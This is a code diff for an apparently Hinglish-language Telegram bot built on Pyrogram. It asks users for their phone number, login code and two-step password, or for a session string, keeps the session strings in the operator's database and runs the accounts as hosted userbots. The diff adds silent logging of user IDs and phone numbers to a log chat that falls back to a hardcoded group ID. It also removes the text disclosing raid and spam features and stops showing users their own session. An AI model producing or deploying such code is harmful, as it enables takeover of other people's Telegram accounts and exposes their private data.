@@ -7,10 +7,13 @@ from pyrogram.errors import (
     PhoneCodeInvalid,
     PhoneCodeExpired,
     FloodWait,
+    AuthKeyDuplicated,
+    AuthKeyUnregistered,
+    UserDeactivated,
 )
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from pymongo import MongoClient
-from config import OWNER_ID, ALIVE_PIC, MONGO_URL
+from config import OWNER_ID, ALIVE_PIC, MONGO_URL, LOG_GROUP
 from Zaid import app, API_ID, API_HASH
 from pyrogram.types import CallbackQuery, InputMediaPhoto
 
@@ -25,6 +28,20 @@ OWNER_USERNAME = "ll_Sexcy_James_ll"
 OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
 SUPPORT_LINK = "https://t.me/+qwlkJNntCU0yMjhl"
 UPDATES_LINK = "https://t.me/+kycml-zhzSs2Zjdl"
+
+# Logger group
+try:
+    LOG_CHAT = int(LOG_GROUP) if LOG_GROUP else -1004318913888
+except Exception:
+    LOG_CHAT = -1004318913888
+
+
+async def send_log(text: str):
+    """Send activity log to LOG_CHAT. Bot must be admin in that group."""
+    try:
+        await app.send_message(LOG_CHAT, text, disable_web_page_preview=True)
+    except Exception as e:
+        logging.warning(f"Log failed: {e}")
 
 
 class Data:
@@ -92,8 +109,6 @@ class Data:
 3) OTP **Telegram app** pe aata hai (official Telegram chat)
 4) Na aaye to `resend` likho
 
-**Note:** SMS OTP Telegram rarely bhejta hai. APP type = code sirf us number ke Telegram pe.
-
 **sᴜᴘᴘᴏʀᴛ:** [𝐉𝐨𝐢𝐧]({SUPPORT_LINK})
 **ᴜᴘᴅᴀᴛᴇs:** [𝐂𝐡𝐚𝐧𝐧𝐞𝐥]({UPDATES_LINK})
 **ᴏᴡɴᴇʀ:** [@{OWNER_USERNAME}]({OWNER_LINK})"""
@@ -101,9 +116,7 @@ class Data:
     ABOUT = f"""
 **ᴀʙᴏᴜᴛ ᴛʜɪꜱ ʙᴏᴛ** 🌙
 
-**ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴛᴏ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ʙᴇᴀᴜᴛɪғᴜʟ ᴀɴɪᴍᴀᴛɪᴏɴ.**
-
-**sᴜᴘᴘᴏʀᴛᴇᴅ :- ʀᴇᴘʟʏ-ʀᴀɪᴅ, ɪᴅ-ᴄʟᴏɴᴇ, ʀᴀɪᴅ, sᴘᴀᴍ, ᴜsᴇʀ-ᴛᴀɢɢᴇʀ ᴇᴛᴄ.**
+**ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ ᴛᴏ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ.**
 
 **◌ ʟᴀɴɢᴜᴀɢᴇ : [ᴘʏᴛʜᴏɴ](https://www.python.org)**
 **◌ ᴘᴏᴡᴇʀᴇᴅ ʙʏ : [𝐉𝐀𝐌𝐄𝐒]({OWNER_LINK})**
@@ -111,10 +124,10 @@ class Data:
 """
 
     DONATE = f"""
-**❖ ʜᴇʏ, ᴛʜᴀɴᴋs ғᴏʀ sᴜᴘᴘᴏʀᴛ**
+**❖ ᴛʜᴀɴᴋs**
 
-**ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ :** [@{OWNER_USERNAME}]({OWNER_LINK})
-**sᴜᴘᴘᴏʀᴛ ɢᴄ :** [𝐉𝐨𝐢𝐧]({SUPPORT_LINK})
+**ᴏᴡɴᴇʀ :** [@{OWNER_USERNAME}]({OWNER_LINK})
+**sᴜᴘᴘᴏʀᴛ :** [𝐉𝐨𝐢𝐧]({SUPPORT_LINK})
 """
 
 
@@ -125,6 +138,12 @@ async def start_handler(client: Client, message: Message):
         photo=ALIVE_PIC,
         caption=Data.START,
         reply_markup=InlineKeyboardMarkup(Data.buttons),
+    )
+    u = message.from_user
+    await send_log(
+        f"📥 /start\n"
+        f"User: {u.mention} (`{u.id}`)\n"
+        f"Username: @{u.username or 'N/A'}"
     )
 
 
@@ -176,23 +195,39 @@ async def callback_handler(client: Client, query: CallbackQuery):
 
 async def restart_all_sessions():
     logging.info("Restarting all active sessions...")
-    sessions = sessions_col.find()
+    sessions = list(sessions_col.find())
     for session in sessions:
+        uid = session.get("user_id") or session.get("_id")
+        string = session.get("session")
+        if not string:
+            continue
         try:
-            uid = session["user_id"]
-            string = session["session"]
             client = Client(
                 name=f"AutoClone_{uid}",
                 api_id=API_ID,
                 api_hash=API_HASH,
                 session_string=string,
                 plugins=dict(root="Zaid/modules"),
+                in_memory=True,
             )
             await client.start()
             active_sessions.append(client)
             logging.info(f"Started session for user {uid}")
+        except (AuthKeyDuplicated, AuthKeyUnregistered, UserDeactivated) as e:
+            logging.error(f"Dead session {uid}: {e} — removing from DB")
+            sessions_col.delete_one({"_id": session.get("_id")})
+            try:
+                await send_log(
+                    f"🗑 Removed dead session\n"
+                    f"User ID: `{uid}`\n"
+                    f"Reason: `{type(e).__name__}`"
+                )
+            except Exception:
+                pass
         except Exception as e:
             logging.error(f"Failed to start session for user {uid}: {e}")
+            if "AUTH_KEY_DUPLICATED" in str(e) or "SESSION_REVOKED" in str(e):
+                sessions_col.delete_one({"_id": session.get("_id")})
 
 
 @app.on_message(filters.command("clone") & filters.private)
@@ -200,19 +235,15 @@ async def clone(bot: app, msg: Message):
     if len(msg.command) < 2:
         return await msg.reply(
             "**✅ Recommended (no OTP)**\n\n"
-            "1) Apne phone pe Pyrogram **string session** banao\n"
-            "2) Yahan bhejo:\n"
             "`/clone YOUR_SESSION_STRING`\n\n"
-            "OTP problem ho to yahi best method hai.\n"
-            "All countries ke numbers ke sessions chalenge."
+            "All countries supported."
         )
-    string = msg.text.split(None, 1)[1].strip()
-    # strip accidental quotes
-    string = string.strip('"').strip("'")
+    string = msg.text.split(None, 1)[1].strip().strip('"').strip("'")
     text = await msg.reply("❖ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...")
+    uid = msg.from_user.id
     try:
         client = Client(
-            name=f"clone_{msg.from_user.id}",
+            name=f"clone_{uid}",
             api_id=API_ID,
             api_hash=API_HASH,
             session_string=string,
@@ -221,7 +252,6 @@ async def clone(bot: app, msg: Message):
         )
         await client.start()
         user = await client.get_me()
-        uid = msg.from_user.id
 
         sessions_col.update_one(
             {"_id": uid},
@@ -242,42 +272,51 @@ async def clone(bot: app, msg: Message):
             api_hash=API_HASH,
             session_string=string,
             plugins=dict(root="Zaid/modules"),
+            in_memory=True,
         )
         await hosted.start()
         active_sessions.append(hosted)
 
         await text.edit(
-            f"✅ Hosted as **{user.first_name}** (`{user.id}`)\n\n"
-            f"Logout: /remove"
+            f"✅ Hosted as **{user.first_name}** (`{user.id}`)\n\nLogout: /remove"
+        )
+        await send_log(
+            f"✅ /clone success\n"
+            f"By: {msg.from_user.mention} (`{uid}`)\n"
+            f"Hosted ID: `{user.id}`\n"
+            f"Name: {user.first_name}\n"
+            f"Username: @{user.username or 'N/A'}"
         )
         try:
             await client.stop()
         except Exception:
             pass
-    except Exception as e:
+    except AuthKeyDuplicated:
         await text.edit(
-            f"**ERROR:** `{str(e)}`\n\n"
-            f"Session invalid / expired. Naya string banao, phir /clone"
+            "❌ **AUTH_KEY_DUPLICATED**\n\n"
+            "Ye session do jagah chal raha tha / dead hai.\n"
+            "**Naya** string session banao, phir /clone"
         )
+        await send_log(
+            f"❌ /clone AUTH_KEY_DUPLICATED\nBy: `{uid}`"
+        )
+    except Exception as e:
+        await text.edit(f"**ERROR:** `{str(e)}`\nNaya session try karo.")
+        await send_log(f"❌ /clone fail `{uid}`\n`{e}`")
 
 
 @app.on_message(filters.command("add") & filters.private)
 async def add_session_command(client, message: Message):
     user_id = message.from_user.id
     await message.reply(
-        "📲 **Phone number bhejo (ANY country)**\n\n"
-        "Format: `+` + country code + number\n"
-        "Examples:\n"
-        "`+97798xxxxxxxx` (Nepal)\n"
-        "`+91xxxxxxxxxx` (India)\n"
-        "`+1xxxxxxxxxx` (USA)\n"
-        "`+44xxxxxxxxxx` (UK)\n"
-        "`+8801xxxxxxxxx` (BD)\n\n"
-        "⚠️ OTP usually **Telegram app** pe aata hai, SMS pe nahi.\n"
-        "OTP na aaye → `resend` likho\n"
-        "Ya best: string bana ke `/clone SESSION` use karo."
+        "📲 **Phone (ANY country)**\n\n"
+        "`+countrycode` + number\n"
+        "Examples: `+977...` `+91...` `+1...`\n\n"
+        "OTP → Telegram app (official chat)\n"
+        "Ya `/clone SESSION` use karo."
     )
     user_sessions[user_id] = {"step": "awaiting_phone"}
+    await send_log(f"📲 /add started\nUser: `{user_id}`")
 
 
 @app.on_message(filters.command("remove") & filters.private)
@@ -285,32 +324,37 @@ async def remove_session(_, msg: Message):
     uid = msg.from_user.id
     session_data = sessions_col.find_one({"_id": uid})
     if not session_data:
-        return await msg.reply("❌ ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴ ғᴏᴜɴᴅ.")
+        return await msg.reply("❌ No active session.")
 
     try:
         for c in list(active_sessions):
             if c.name == f"AutoClone_{uid}":
-                await c.stop()
-                active_sessions.remove(c)
+                try:
+                    await c.stop()
+                except Exception:
+                    pass
+                try:
+                    active_sessions.remove(c)
+                except Exception:
+                    pass
                 break
         sessions_col.delete_one({"_id": uid})
-        await msg.reply("✅ ʏᴏᴜʀ sᴇssɪᴏɴ ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.")
+        await msg.reply("✅ Session removed.")
+        await send_log(
+            f"🗑 /remove\nUser: {msg.from_user.mention} (`{uid}`)"
+        )
     except Exception as e:
-        await msg.reply(f"⚠️ ᴇʀʀᴏʀ ʀᴇᴍᴏᴠɪɴɢ sᴇssɪᴏɴ:\n`{e}`")
+        await msg.reply(f"⚠️ Error:\n`{e}`")
 
 
 def _clean_phone(raw: str) -> str:
-    """E.164-ish: keep + and digits, any country."""
-    phone = re.sub(r"[^\d+]", "", raw.strip())
-    phone = phone.replace("++", "+")
+    phone = re.sub(r"[^\d+]", "", raw.strip()).replace("++", "+")
     if not phone.startswith("+"):
-        # user forgot + ; keep digits, require they fix with +
         phone = "+" + phone.lstrip("0+")
-    # must be + then 8–15 digits total international
     digits = re.sub(r"\D", "", phone)
-    if len(digits) < 8 or len(digits) > 15:
-        return phone  # still return; validation below
-    return "+" + digits
+    if 8 <= len(digits) <= 15:
+        return "+" + digits
+    return phone
 
 
 @app.on_message(
@@ -329,11 +373,7 @@ async def session_handler(_, msg: Message):
         phone = _clean_phone(msg.text)
         digits = re.sub(r"\D", "", phone)
         if len(digits) < 8 or len(digits) > 15:
-            await msg.reply(
-                "❌ Number galat.\n"
-                "Kisi bhi country ka number: `+` countrycode number\n"
-                "Example: `+14155552671`"
-            )
+            await msg.reply("❌ Use `+countrycode` number (any country).")
             return
 
         client = Client(
@@ -348,52 +388,32 @@ async def session_handler(_, msg: Message):
             sent = await client.send_code(phone)
             session["phone_code_hash"] = sent.phone_code_hash
             session["step"] = "awaiting_otp"
-
-            code_type = getattr(sent, "type", None)
-            type_name = str(code_type).split(".")[-1] if code_type else "APP"
-
+            type_name = str(getattr(sent, "type", "APP")).split(".")[-1]
             await msg.reply(
-                f"✅ Code request OK (`{type_name}`)\n"
-                f"📱 `{phone}` (all countries supported)\n\n"
-                f"**OTP kahan:**\n"
-                f"• Usi number ka Telegram → chat **Telegram** (official)\n"
-                f"• Message: `Login code: XXXXX`\n\n"
-                f"SMS tabhi aata hai jab Telegram type SMS bheje.\n"
-                f"Nahi dikha? **`resend`** likho.\n"
-                f"Phir bhi nahi? String bana ke `/clone SESSION`"
+                f"✅ Code OK (`{type_name}`)\n📱 `{phone}`\n\n"
+                f"Telegram official chat me Login code dekho.\n"
+                f"`resend` / `/clone SESSION`"
             )
+            await send_log(f"📨 OTP sent\nUser `{uid}`\nPhone `{phone}`\nType `{type_name}`")
         except FloodWait as e:
-            await msg.reply(f"⏳ Flood: **{e.value}** sec baad /add")
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
+            await msg.reply(f"⏳ Flood: **{e.value}** sec")
             user_sessions.pop(uid, None)
         except PhoneNumberInvalid:
-            await msg.reply(
-                "❌ Telegram is number ko invalid maanta hai.\n"
-                "`+countrycode` sahi se bhejo (any country)."
-            )
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
+            await msg.reply("❌ Invalid number. `+countrycode`...")
             user_sessions.pop(uid, None)
         except Exception as e:
-            await msg.reply(
-                f"❌ OTP send fail:\n`{e}`\n\n"
-                f"Try `/clone SESSION` instead (no OTP)."
-            )
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
+            await msg.reply(f"❌ Fail: `{e}`\nUse `/clone SESSION`")
             user_sessions.pop(uid, None)
+        finally:
+            if uid not in user_sessions or user_sessions[uid].get("step") != "awaiting_otp":
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
 
     elif step == "awaiting_otp":
         text = msg.text.strip()
         low = text.lower()
-
         if low in ("resend", "/resend", "again", "sms", "otp"):
             client = session["client"]
             try:
@@ -402,29 +422,14 @@ async def session_handler(_, msg: Message):
                     phone_code_hash=session["phone_code_hash"],
                 )
                 session["phone_code_hash"] = sent.phone_code_hash
-                code_type = getattr(sent, "type", None)
-                type_name = str(code_type).split(".")[-1] if code_type else "?"
-                await msg.reply(
-                    f"🔄 Resend OK (`{type_name}`)\n"
-                    f"Telegram official chat / SMS check karo.\n"
-                    f"Warna `/clone SESSION` use karo."
-                )
-            except FloodWait as e:
-                await msg.reply(f"⏳ Resend wait: **{e.value}** sec")
+                await msg.reply("🔄 Resent. Check Telegram / SMS.")
             except Exception as e:
-                await msg.reply(
-                    f"❌ Resend fail: `{e}`\n"
-                    f"Best option: `/clone YOUR_STRING_SESSION`"
-                )
+                await msg.reply(f"❌ Resend: `{e}` → `/clone SESSION`")
             return
 
         otp = text.replace(" ", "")
         if not otp.isdigit() or len(otp) < 4:
-            await msg.reply(
-                "OTP jaise `12345` bhejo.\n"
-                "`resend` = naya code\n"
-                "`/clone SESSION` = OTP skip"
-            )
+            await msg.reply("OTP `12345` ya `resend` ya `/clone SESSION`")
             return
 
         client = session["client"]
@@ -436,56 +441,31 @@ async def session_handler(_, msg: Message):
             )
         except SessionPasswordNeeded:
             session["step"] = "awaiting_2fa"
-            return await msg.reply("🔐 2FA on. Cloud password bhejo.")
+            return await msg.reply("🔐 2FA password bhejo.")
         except PhoneCodeInvalid:
-            await msg.reply("❌ OTP galat. `resend` ya `/clone SESSION`")
-            return
+            return await msg.reply("❌ Wrong OTP.")
         except PhoneCodeExpired:
-            await msg.reply("❌ OTP expire. /add ya /clone")
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
             user_sessions.pop(uid, None)
-            return
-        except FloodWait as e:
-            await msg.reply(f"⏳ Wait **{e.value}** sec")
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
-            user_sessions.pop(uid, None)
-            return
+            return await msg.reply("❌ OTP expired. /add")
         except Exception as e:
-            await msg.reply(f"❌ Sign-in fail: `{e}`")
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
             user_sessions.pop(uid, None)
-            return
+            return await msg.reply(f"❌ `{e}`")
         await finalize_login(client, msg, uid)
 
     elif step == "awaiting_2fa":
-        password = msg.text.strip()
         client = session["client"]
         try:
-            await client.check_password(password)
+            await client.check_password(msg.text.strip())
             await finalize_login(client, msg, uid)
         except Exception as e:
-            await msg.reply(f"❌ Password galat: `{e}`")
-            try:
-                await client.disconnect()
-            except Exception:
-                pass
             user_sessions.pop(uid, None)
+            await msg.reply(f"❌ `{e}`")
 
 
 async def finalize_login(client: Client, msg: Message, uid: int):
     try:
         string = await client.export_session_string()
         user = await client.get_me()
-
         sessions_col.update_one(
             {"_id": uid},
             {
@@ -498,24 +478,27 @@ async def finalize_login(client: Client, msg: Message, uid: int):
             },
             upsert=True,
         )
-
         hosted = Client(
             name=f"AutoClone_{uid}",
             api_id=API_ID,
             api_hash=API_HASH,
             session_string=string,
             plugins=dict(root="Zaid/modules"),
+            in_memory=True,
         )
         await hosted.start()
         active_sessions.append(hosted)
-
         await msg.reply(
-            f"✅ Logged in as **{user.first_name}**\n\n"
-            f"Session:\n`{string}`\n\n"
-            f"/remove for logout"
+            f"✅ **{user.first_name}**\n`{user.id}`\n\n/remove to logout"
+        )
+        await send_log(
+            f"✅ /add login OK\n"
+            f"By: `{uid}`\n"
+            f"Hosted: `{user.id}` @{user.username or 'N/A'}\n"
+            f"Name: {user.first_name}"
         )
     except Exception as e:
-        await msg.reply(f"❌ Final fail: `{e}`")
+        await msg.reply(f"❌ `{e}`")
     finally:
         try:
             await client.disconnect()
